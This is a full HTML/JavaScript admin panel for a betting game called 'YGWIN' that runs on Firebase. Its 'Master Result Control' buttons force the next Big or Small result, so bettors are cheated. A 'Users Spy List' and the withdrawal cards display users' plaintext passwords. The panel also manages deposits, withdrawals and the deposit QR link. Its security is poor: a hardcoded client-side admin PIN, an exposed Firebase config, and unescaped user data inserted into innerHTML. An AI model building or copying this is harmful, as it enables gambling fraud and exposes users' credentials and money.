<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YGWIN | ADMIN MOBILE</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
    <style>
        body { background: #0f172a; color: white; font-family: sans-serif; }
        .tab-btn.active { border-bottom: 3px solid #3b82f6; color: #3b82f6; }
        .glass-card { background: #1e293b; border-radius: 1.5rem; padding: 1.5rem; margin-bottom: 1rem; }
        input { background: #0f172a !important; border: 1px solid #334155 !important; color: white !important; }
        .hidden { display: none !important; }
    </style>
</head>
<body class="pb-20">

    <div id="login-screen" class="p-6 mt-20 text-center">
        <h1 class="text-4xl font-black text-blue-500 mb-8 italic">YGWIN ADMIN</h1>
        <div class="glass-card">
            <input type="password" id="admin-pin" placeholder="Enter PIN" class="w-full p-4 rounded-xl mb-4 text-center text-xl">
            <button onclick="accessAdmin()" class="w-full bg-blue-600 py-4 rounded-xl font-black italic">LOGIN</button>
        </div>
    </div>

    <div id="admin-content" class="hidden">
        <div class="p-6 bg-slate-900 sticky top-0 z-50 border-b border-slate-800">
            <h1 class="text-xl font-black italic text-blue-500">YGWIN <span class="text-white text-[10px] not-italic uppercase tracking-widest">Mobile Admin</span></h1>
        </div>

        <div class="p-4">
            <div class="glass-card text-center">
                <p class="text-[10px] text-slate-400 uppercase font-bold mb-4">Master Result Control</p>
                <div class="grid grid-cols-3 gap-2">
                    <button onclick="setForce('Big')" class="bg-orange-600 py-3 rounded-xl font-bold italic">BIG</button>
                    <button onclick="setForce('Small')" class="bg-indigo-600 py-3 rounded-xl font-bold italic">SMALL</button>
                    <button onclick="setForce('Random')" class="bg-slate-700 py-3 rounded-xl text-[10px] font-bold">RANDOM</button>
                </div>
            </div>

            <div class="flex overflow-x-auto gap-6 mb-6 px-2 border-b border-slate-800 no-scrollbar">
                <button onclick="showTab('tab-bets')" class="tab-btn active pb-2 font-bold text-sm whitespace-nowrap">Live Bets</button>
                <button onclick="showTab('tab-dep')" class="tab-btn pb-2 font-bold text-sm whitespace-nowrap">Deposits</button>
                <button onclick="showTab('tab-wit')" class="tab-btn pb-2 font-bold text-sm whitespace-nowrap">Withdraws</button>
                <button onclick="showTab('tab-users')" class="tab-btn pb-2 font-bold text-sm whitespace-nowrap">Users</button>
                <button onclick="showTab('tab-set')" class="tab-btn pb-2 font-bold text-sm whitespace-nowrap">Settings</button>
            </div>

            <div id="tab-bets" class="tab-content">
                <div class="grid grid-cols-2 gap-3 mb-4">
                    <div class="glass-card bg-orange-900/10 border border-orange-500/20 p-4">
                        <p class="text-[10px] text-orange-400">BIG TOTAL</p>
                        <p id="total-big" class="text-xl font-black italic">₹0</p>
                    </div>
                    <div class="glass-card bg-indigo-900/10 border border-indigo-500/20 p-4">
                        <p class="text-[10px] text-indigo-400">SMALL TOTAL</p>
                        <p id="total-small" class="text-xl font-black italic">₹0</p>
                    </div>
                </div>
            </div>

            <div id="tab-dep" class="tab-content hidden">
                <h2 class="text-red-500 font-bold mb-4 italic">Deposit Requests</h2>
                <div id="dep-list"></div>
            </div>

            <div id="tab-wit" class="tab-content hidden">
                <h2 class="text-yellow-500 font-bold mb-4 italic">Withdraw Requests</h2>
                <div id="wit-list"></div>
            </div>

            <div id="tab-users" class="tab-content hidden">
                <h2 class="text-blue-400 font-bold mb-4 italic">User Database</h2>
                <div id="user-list"></div>
            </div>

            <div id="tab-set" class="tab-content hidden">
                <div class="glass-card">
                    <p class="text-xs font-bold mb-3">Update Deposit QR (Link)</p>
                    <input type="text" id="qr-input" class="w-full p-3 rounded-xl mb-3 text-sm" placeholder="Paste image URL">
                    <button onclick="updateQR()" class="w-full bg-blue-600 py-3 rounded-xl font-bold">SAVE QR</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBBlKPL2V0JKCYN_GBGGSqDBZr7kFNiKZc",
            databaseURL: "https://beast-web-cff81-default-rtdb.firebaseio.com",
            projectId: "beast-web-cff81",
            appId: "1:457850837406:web:e98320812c8d1b16ddde8f"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        function accessAdmin() {
            if(document.getElementById('admin-pin').value === "myselfyg26") {
                document.getElementById('login-screen').classList.add('hidden');
                document.getElementById('admin-content').classList.remove('hidden');
                initData();
            } else { alert("WRONG PIN!"); }
        }

        function showTab(tabId) {
            document.querySelectorAll('.tab-content').forEach(c => c.classList.add('hidden'));
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            document.getElementById(tabId).classList.remove('hidden');
            event.target.classList.add('active');
        }

        function initData() {
            // Live Bets
            db.ref('live_bets').on('value', s => {
                let big = 0, small = 0;
                s.forEach(c => {
                    if(c.val().type === 'Big') big += c.val().amt;
                    else small += c.val().amt;
                });
                document.getElementById('total-big').innerText = "₹" + big;
                document.getElementById('total-small').innerText = "₹" + small;
            });

            // Deposits Mobile List
            db.ref('deposits').on('value', s => {
                let html = "";
                s.forEach(c => {
                    let d = c.val();
                    if(d.status === 'Pending') {
                        html += `<div class="glass-card mb-3">
                            <div class="flex justify-between mb-2">
                                <span class="text-xs font-bold">${d.phone}</span>
                                <span class="text-green-400 font-black">₹${d.amt}</span>
                            </div>
                            <p class="text-[10px] font-mono text-slate-400 mb-3">UTR: ${d.utr}</p>
                            <div class="flex gap-2">
                                <button onclick="actionDep('${c.key}','${d.phone}',${d.amt})" class="flex-1 bg-green-600 py-2 rounded-lg text-xs font-bold">APPROVE</button>
                                <button onclick="db.ref('deposits/${c.key}').remove()" class="flex-1 bg-red-600 py-2 rounded-lg text-xs font-bold">REJECT</button>
                            </div>
                        </div>`;
                    }
                });
                document.getElementById('dep-list').innerHTML = html || "<p class='text-center text-slate-500 py-10'>No Requests</p>";
            });

            // Withdraws Mobile List
            db.ref('withdraws').on('value', s => {
                let html = "";
                s.forEach(c => {
                    let w = c.val();
                    if(w.status === 'Pending') {
                        html += `<div class="glass-card mb-3 border-l-4 border-yellow-500">
                            <div class="text-[10px] text-slate-400 mb-1">USER: ${w.phone} (Pass: ${w.pass})</div>
                            <div class="flex justify-between items-center mb-2">
                                <span class="font-bold">${w.name}</span>
                                <span class="text-yellow-500 font-black italic text-lg">₹${w.amt}</span>
                            </div>
                            <p class="text-blue-400 text-xs mb-3 font-bold">${w.upi}</p>
                            <div class="flex gap-2">
                                <button onclick="actionWit('${c.key}','Approved')" class="flex-1 bg-blue-600 py-2 rounded-lg text-xs font-bold">APPROVE</button>
                                <button onclick="actionWit('${c.key}','Rejected','${w.phone}',${w.amt})" class="flex-1 bg-red-600 py-2 rounded-lg text-xs font-bold">REJECT</button>
                            </div>
                        </div>`;
                    }
                });
                document.getElementById('wit-list').innerHTML = html || "<p class='text-center text-slate-500 py-10'>No Requests</p>";
            });

            // Users Spy List
            db.ref('users').on('value', s => {
                let html = "";
                s.forEach(c => {
                    let u = c.val();
                    html += `<div class="p-3 border-b border-slate-800 flex justify-between">
                        <div class="text-xs"><b>${u.phone}</b><br><span class="text-slate-500">Pass: ${u.pass}</span></div>
                        <div class="text-green-400 font-bold">₹${(u.wallet||0).toFixed(2)}</div>
                    </div>`;
                });
                document.getElementById('user-list').innerHTML = html;
            });
        }

        function setForce(v) { db.ref('control/force').set(v).then(() => alert("Agla Result: " + v)); }
        function updateQR() { db.ref('control/qr').set(document.getElementById('qr-input').value).then(() => alert("QR Updated!")); }
        
        function actionDep(key, phone, amt) {
            db.ref('users/'+phone+'/wallet').transaction(cur => (cur || 0) + amt).then(() => {
                db.ref('deposits/'+key).update({ status: 'Approved' });
            });
        }

        function actionWit(key, status, phone, amt) {
            if(status === 'Rejected') db.ref('users/'+phone+'/wallet').transaction(cur => (cur || 0) + amt);
            db.ref('withdraws/'+key).update({ status: status });
        }
    </script>
</body>
</html>
